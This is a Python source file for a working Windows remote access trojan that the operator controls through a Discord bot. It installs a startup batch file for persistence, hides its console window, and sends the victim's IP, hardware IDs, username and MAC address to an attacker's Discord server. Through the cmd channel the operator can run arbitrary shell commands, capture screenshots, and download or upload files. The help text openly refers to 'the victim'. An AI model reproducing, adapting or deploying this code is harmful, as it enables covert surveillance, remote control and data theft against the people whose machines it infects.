import os
import socket
import discord
import requests
import platform
import win32gui
import pyautogui
import subprocess
import win32console
from getmac import get_mac_address as gma
from win32com.shell import shell, shellcon



token = ""
your_server_id=000000000

open(f'{shell.SHGetFolderPath(0, (shellcon.CSIDL_STARTUP, shellcon.CSIDL_COMMON_STARTUP)[0], None, 0)}\\winver.bat', "w").write(f"@echo off\npy {os.getenv('appdata')}\\r.py")
try:
    os.rename(f"{__file__}", f"{os.getenv('appdata')}\\r.py")
except:...
sid=int(your_server_id)
# Hide the window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

client = discord.Client(intents=discord.Intents.all())
@client.event
async def on_ready():
    global appdata, cmd_c, upm, cwd
    print(f'{client.user} has connected to Discord!')
    appdata=os.getenv("appdata")
    # Get PC/network info
    gpu=subprocess.check_output("wmic path win32_VideoController get name").decode(('utf-8')).split("\n")[1].replace("\r", "")
    cpu=subprocess.check_output("wmic cpu get name").decode(('utf-8')).split("\n")[1].replace("\r", "")
    username = os.getenv("username")
    oss=platform.platform(terse=True)
    uuid = os.popen("wmic csproduct get UUID").read().split()[-1]
    ip=requests.get("https://capybara.uno/api/ip.php").text
    lip=socket.gethostbyname_ex(socket.gethostname())[2][-1]
    mac=gma()
    # Create channel and stuff
    guild = client.get_guild(sid)
    category = await guild.create_category(username)
    info_c=await category.create_text_channel("info")
    cmd_c=await category.create_text_channel("cmd")
    cwd=f"C:\\Users\\{os.getenv('USERNAME')}\\Desktop"
    upm=False
    await info_c.send(f"""||@everyone||\n```
IP: {ip}
Os: {oss}
Gpu: {gpu}
Cpu: {cpu}
UUID: {uuid}
UserName: {username}
Local IP: {lip}
Mac Adress: {mac}
```""")

@client.event
async def on_message(message):
    global upm, cwd
    if message.channel.id==cmd_c.id:
        # Command
        if message.content==".help":
            await message.channel.send("```.ss : Send a screenshot of the victim\n.cmd [command] : Execut a command on the victim pc\n.ls : Send all files in the current directory\n.download [File name]: Send a file from the victim pc\n.upload : Upload a file from your computer to the victim machine\n.cd [directory] : Change the current directory\n.pwd : Print current directory\n.mkdir [Name] : Create a directory```")
        
        if upm:
            if str(message.attachments) == "[]":
                upm=False
                await message.channel.send("`Invalid file`")
                return
            else:
                upm=False
                split_v1 = str(message.attachments).split("filename='")[1]
                filename = str(split_v1).split("' ")[0]
                await message.attachments[0].save(fp=f"{cwd}\\{filename}")
                await message.channel.send("`File uploaded succesfully`")
                return

        if message.content==".ss":
            await message.channel.send("`Please wait...`")
            ss = pyautogui.screenshot()
            ss.save(appdata+"\\a.png")
            f=open(appdata+"\\a.png", 'rb')
            file = discord.File(f, filename='image.jpg')
            embed = discord.Embed()
            embed=discord.Embed(description="Here you go :thumbsup:")
            embed.set_image(url='attachment://image.jpg')
            await cmd_c.send(embed=embed, file=file)

        elif message.content.startswith(".cmd"):
            cmd=(message.content).replace(".cmd ", "")
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output,err = process.communicate()
            output=output.decode('latin-1', errors='replace').replace('\r','')
            await message.channel.send(f"`{output}`" if len(output)>=1 else "`No output`")

        elif message.content==".ls":
            await message.channel.send("```"+"\n".join(next(os.walk(cwd), (None, None, []))[2]+next(os.walk(cwd), (None, None, []))[1])+"```" if len(os.listdir(cwd))>=1 else "`No file found in the current directory`")

        elif message.content.startswith(".download"):
            await message.channel.send(file=discord.File(cwd+"\\"+message.content.replace(".download ", "")))

        elif message.content==".upload":
            await message.channel.send("`Please send the file to upload`")
            upm=True

        elif message.content.startswith(".cd"):
            try:
                os.chdir(cwd+"\\"+message.content.replace(".cd ", ""))
                if message.content.replace(".cd ", "")=="..":
                    cwd=os.getcwd()
                else:
                    cwd=cwd+"\\"+message.content.replace(".cd ", "") if len(message.content.replace(".cd ", "").split("/"))==1 else message.content.replace(".cd ", "")
                await message.channel.send("`"+cwd+"> `")
            except FileNotFoundError:
                await message.channel.send("`The specified file does not exist`")

        elif message.content==".pwd":
            await message.channel.send("`"+cwd+"`")

        elif message.content.startswith(".mkdir"):
            try:
                os.mkdir(cwd+"\\"+message.content.replace(".mkdir ", ""))
                await message.channel.send(f"`Directory created`")
            except:
                await message.channel.send("`Invalid file name`")
client.run(token)
